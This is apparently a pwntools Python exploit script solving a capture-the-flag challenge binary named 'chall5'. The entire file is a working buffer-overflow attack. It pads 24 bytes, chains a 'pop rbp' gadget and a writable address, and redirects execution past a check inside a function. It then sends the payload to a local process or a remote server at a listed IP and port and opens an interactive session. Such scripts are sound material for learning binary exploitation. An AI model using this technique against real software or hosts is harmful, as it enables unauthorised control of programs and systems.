#!/usr/bin/env python3

from pwn import *

elf =context.binary = ELF('./chall5')
rop=ROP(elf)
context.log_level = 'debug'

def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript='b *register_name')
    else:
        if args.REMOTE:
            return remote('207.154.255.198' ,1111)
        else:
            return process()  
io=start()   

payload = b'a'*(24) 
payload += p64(0x000000000040121d)#pop rbp
#payload += p64(0x0000000000405000)#writeable address 
payload += p64(0x404500)#writeable address
payload += p64(0x0000000000401292)#jump inside the hacked function (after the comparaison)
write('pay',payload)
io.sendline(payload)
io.interactive()